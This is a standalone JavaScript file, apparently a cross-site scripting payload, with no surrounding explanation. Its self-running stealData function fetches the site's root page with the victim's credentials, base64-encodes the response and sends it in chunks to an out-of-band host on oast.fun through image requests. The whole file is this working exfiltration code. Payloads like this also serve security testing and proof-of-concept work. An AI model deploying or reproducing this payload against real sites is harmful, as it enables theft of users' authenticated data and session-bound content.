function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}


function stealData() {
    var uri = "/";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", uri, true);
    xhr.withCredentials = true;
    xhr.send(null);
    xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var dataResponse = read_body(xhr);
        // Фикс Unicode → base64
        var exfilData = btoa(unescape(encodeURIComponent(dataResponse)));
        var exfilChunkSize = 2000;
        var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
        for (var i = 0; i < numFullChunks; i++) {
            var chunk = exfilData.slice(exfilChunkSize * i, exfilChunkSize * (i + 1));
            new Image().src = "https://ydwfqckvgqntzrjxvxllufphukkslkx48.oast.fun/exfil/" + i + "/" + chunk + ".jpg";
        }
        var lastChunk = exfilData.slice(exfilChunkSize * numFullChunks);
        new Image().src = "https://ydwfqckvgqntzrjxvxllufphukkslkx48.oast.fun/exfil/LAST/" + lastChunk + ".jpg";
    }
};
}


stealData();
